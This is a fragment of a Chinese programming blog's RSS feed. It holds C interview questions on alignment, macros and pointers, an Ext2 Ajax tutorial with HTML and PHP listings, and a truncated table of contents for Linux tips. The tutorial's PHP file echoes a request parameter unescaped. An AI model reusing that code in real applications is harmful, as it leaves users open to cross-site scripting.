<![CDATA[1。数据对齐<br>struct tc{<br>&nbsp;char c[6];<br>&nbsp;long l;<br>};<br>sizeof(struct tc)在不同情况下的大小是多少？<br>1字节强制对齐<br>2字节强制对齐<br>4字节强制对齐<br><br>2。宏定义<br>#define FUNC(x) x/x<br>int a=6, b=2;<br>printf("%d\n", FUNC(a)/FUNC(b));<br>输出是什么？<br><br>3。字节操作<br>定义一个宏，实现将0x12345678转换为0x78563412<br>#define MACCHG(x) _____________<br><br>4。指针操作<br>struct stx{<br>&nbsp;long a;<br>&nbsp;long b;<br>};<br>struct stx *p = (struct stx*)malloc(2*sizeof(struct stx));<br>p+=sizeof(struct stx);<br>+=操作导致p向后移动了多少字节？<br><br>5。移位操作<br>a=0x123 b=0x4 c=0x1234<br>int c = a&lt;&lt;4+b;<br>这句代码有什么问题？]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>C/C++</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372010731101556266/</guid>
    </item>
    <item>
      <title>
<![CDATA[Ajax in Ext2]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200832462857349/</link>
      <description>
<![CDATA[1. 一个例子，包括一个html和一个php文件，参见附录A和B<br>2. Ext.Ajax.request 方法，参见文档，很经典的调用方法，没什么好说的。<br>3. 关键在于response是一个XMLHttpRequest对象，但该对象在Ext2文档没有讲，它的方法是什么？参照说明打开http://www.w3.org/TR/XMLHttpRequest/， 获得response的XMLHttpRequest接口文档，参见附录C<br><span style="font-family: monospace;"  >4.除了W3的接口文档，还可以将response转化为JSON。<br>var jsonA = Ext.util.JSON.decode(response.responseText);<br></span><br><br>附录A. test.html.<br>&lt;html&gt;<br>&lt;head&gt;<br>&lt;link rel="stylesheet" type="text/css" href="../js/resources/css/ext-all.css"/&gt;<br>&lt;script type="text/javascript" src="../js/adapter/ext/ext-base.js"&gt;&lt;/script&gt;<br>&lt;script type="text/javascript" src="../js/ext-all.js"&gt;&lt;/script&gt;<br>&lt;script language="javascript"&gt;<br>function fn(resp){<br>&nbsp;&nbsp;&nbsp; //Ext.get("msg").update("Hello, "+Ext.get("name").getValue());<br>&nbsp;&nbsp;&nbsp; Ext.get("msg").update(resp.responseText);<br>}<br>function f(){<br>&nbsp;&nbsp;&nbsp; Ext.Ajax.request({<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; url:"test.php",<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; params: "name="+Ext.get("name").getValue(),<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; callback: function(options,success,response){fn(response);}<br>&nbsp;&nbsp;&nbsp; });<br>}<br>Ext.onReady(function(){<br>Ext.get("btn").addListener("click",f);<br>});<br>&lt;/script&gt;<br>&lt;/head&gt;<br>&lt;body&gt;<br>&lt;form id="sayhi"&gt;<br>&nbsp;&nbsp;&nbsp; &lt;input type="text" id="name"&gt;&lt;/input&gt;<br>&nbsp;&nbsp;&nbsp; &lt;input type="button" id="btn" value="Hello"&gt;&lt;/input&gt;<br>&lt;/form&gt;<br>&nbsp;&nbsp;&nbsp; &lt;div id="msg"&gt;&lt;/div&gt;<br>&lt;/body&gt;<br>&lt;/html&gt;<br><br>附录 B. test.php<br>&lt;?<br>echo "hello, ",$_REQUEST["name"];<br>?&gt;<br><br>附录C<br><pre>interface <dfn>XMLHttpRequest</dfn> {<br>  // event handler<br>           attribute EventListener <a rel="nofollow" href="http://www.w3.org/TR/XMLHttpRequest/#onreadystatechange"  >onreadystatechange</a>;<br><br>  // state<br>  const unsigned short <a title="UNSENT state" rel="nofollow" href="http://www.w3.org/TR/XMLHttpRequest/#unsent-state"  >UNSENT</a> = 0;<br>  const unsigned short <a title="OPENED state" rel="nofollow" href="http://www.w3.org/TR/XMLHttpRequest/#opened-state"  >OPENED</a> = 1;<br>  const unsigned short <a title="HEADERS_RECEIVED state" rel="nofollow" href="http://www.w3.org/TR/XMLHttpRequest/#headers-received-state"  >HEADERS_RECEIVED</a> = 2;<br>  const unsigned short <a title="LOADING state" rel="nofollow" href="http://www.w3.org/TR/XMLHttpRequest/#loading-state"  >LOADING</a> = 3;<br>  const unsigned short <a title="DONE state" rel="nofollow" href="http://www.w3.org/TR/XMLHttpRequest/#done-state"  >DONE</a> = 4;<br>  readonly attribute unsigned short <a rel="nofollow" href="http://www.w3.org/TR/XMLHttpRequest/#readystate"  >readyState</a>;<br><br>  // request<br>  void <a rel="nofollow" href="http://www.w3.org/TR/XMLHttpRequest/#open"  >open</a>(in DOMString <var>method</var>, in DOMString <var>url</var>);<br>  void <a rel="nofollow" href="http://www.w3.org/TR/XMLHttpRequest/#open"  >open</a>(in DOMString <var>method</var>, in DOMString <var>url</var>, in boolean <var>async</var>);<br>  void <a rel="nofollow" href="http://www.w3.org/TR/XMLHttpRequest/#open"  >open</a>(in DOMString <var>method</var>, in DOMString <var>url</var>, in boolean <var>async</var>, in DOMString <var>user</var>);<br>  void <a rel="nofollow" href="http://www.w3.org/TR/XMLHttpRequest/#open"  >open</a>(in DOMString <var>method</var>, in DOMString <var>url</var>, in boolean <var>async</var>, in DOMString <var>user</var>, in DOMString <var>password</var>);<br>  void <a rel="nofollow" href="http://www.w3.org/TR/XMLHttpRequest/#setrequestheader"  >setRequestHeader</a>(in DOMString <var>header</var>, in DOMString <var>value</var>);<br>  void <a rel="nofollow" href="http://www.w3.org/TR/XMLHttpRequest/#send"  >send</a>();<br>  void <a rel="nofollow" href="http://www.w3.org/TR/XMLHttpRequest/#send"  >send</a>(in DOMString <var>data</var>);<br>  void <a rel="nofollow" href="http://www.w3.org/TR/XMLHttpRequest/#send"  >send</a>(in Document <var>data</var>);<br>  void <a rel="nofollow" href="http://www.w3.org/TR/XMLHttpRequest/#abort"  >abort</a>();<br><br>  // response<br>  DOMString <a rel="nofollow" href="http://www.w3.org/TR/XMLHttpRequest/#getallresponseheaders"  >getAllResponseHeaders</a>();<br>  DOMString <a rel="nofollow" href="http://www.w3.org/TR/XMLHttpRequest/#getresponseheader"  >getResponseHeader</a>(in DOMString <var>header</var>);<br>  readonly attribute DOMString <a rel="nofollow" href="http://www.w3.org/TR/XMLHttpRequest/#responsetext"  >responseText</a>;<br>  readonly attribute Document <a rel="nofollow" href="http://www.w3.org/TR/XMLHttpRequest/#responsexml"  >responseXML</a>;<br>  readonly attribute unsigned short <a rel="nofollow" href="http://www.w3.org/TR/XMLHttpRequest/#status"  >status</a>;<br>  readonly attribute DOMString <a rel="nofollow" href="http://www.w3.org/TR/XMLHttpRequest/#statustext"  >statusText</a>;<br>};</pre><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937200832462857349/</guid>
    </item>
    <item>
      <title>
<![CDATA[[Fw]100-Linux-Tips-And-Tricks-1]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937200832521347945/</link>
      <description>
<![CDATA[<P style="MARGIN: 0cm 0cm 0pt; tab-stops: 21.0pt right dotted 539.5pt;"  ><SPAN lang="EN-US" ><SPAN><SPAN style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894701"  ><FONT face="Times New Roman"  >1.<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Installation<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >3</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN style="mso-no-proof: yes;"  ></SPAN></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894702"  ><FONT face="Times New Roman"  >1.1<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 1: Which distribution is good for you<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >3</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894703"  ><FONT face="Times New Roman"  >1.2<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 2: How to find a Linux CD-ROM at low cost<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >3</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894704"  ><FONT face="Times New Roman"  >1.3<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 3: Multiple operating systems<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >3</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894705"  ><FONT face="Times New Roman"  >1.4<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>4: Installing with no CD-ROM drive or modem<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >.. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >4</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894706"  ><FONT face="Times New Roman"  >1.5<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 5: Swap and memory<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >4</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894707"  ><FONT face="Times New Roman"  >1.6<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 6: More swap with a swap file<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >5</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894708"  ><FONT face="Times New Roman"  >1.7<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 7: Kernel size and modules<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >5</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894709"  ><FONT face="Times New Roman"  >1.8<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 8: The boot prompt<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >5</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894710"  ><FONT face="Times New Roman"  >1.9<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 9: Wrong memory size found<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >5</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894711"  ><FONT face="Times New Roman"  >1.10<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 10: Master boot record and LILO<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >.. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >5</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894712"  ><FONT face="Times New Roman"  >1.11<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 11: LILO can't find a kernel on a big drive<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >6</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894713"  ><FONT face="Times New Roman"  >1.12<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 12: X Window configuration options<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >6</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894714"  ><FONT face="Times New Roman"  >1.13<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 13: Allowing users to mount drives<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >6</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894715"  ><FONT face="Times New Roman"  >1.14<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 14: Allowing users to run root programs<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >6</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894716"  ><FONT face="Times New Roman"  >1.15<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 15: Linux and NT booting<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >6</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894717"  ><FONT face="Times New Roman"  >1.16<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 16: Annoying boot messages<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >7</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894718"  ><FONT face="Times New Roman"  >1.17<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 17: Programs on CD-ROM<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >.. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >7</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894719"  ><FONT face="Times New Roman"  >1.18<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 18: International console<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >7</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894720"  ><FONT face="Times New Roman"  >1.19<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 19: Multiple kernels choices<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >7</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894721"  ><FONT face="Times New Roman"  >1.20<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 20: Default file permissions<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  > </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >7</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ></SPAN></FONT></A></SPAN></SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ></SPAN></P>  <P style="MARGIN: 0cm 0cm 0pt 21pt; tab-stops: 52.5pt right dotted 539.5pt;"  ><SPAN><SPAN lang="EN-US" style="mso-no-proof: yes;"  ><A href="http://hankjin.blog.163.com/blankEditor.html#_Toc196894722"  ><FONT face="Times New Roman"  >1.21<SPAN style="COLOR: windowtext; TEXT-DECORATION: none; text-underline: none;"  ><SPAN style="mso-tab-count: 1;"  >&nbsp;&nbsp;&nbsp; </SPAN></SPAN>Tip 21: Default boot mode<SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  ><SPAN style="mso-tab-count: 1 dotted;"  >. </SPAN></SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; TEXT-DECORATION: none; text-underline: none; mso-hide: screen;"  >8</SPAN><SPAN style="DISPLAY: none; COLOR: windowtext; 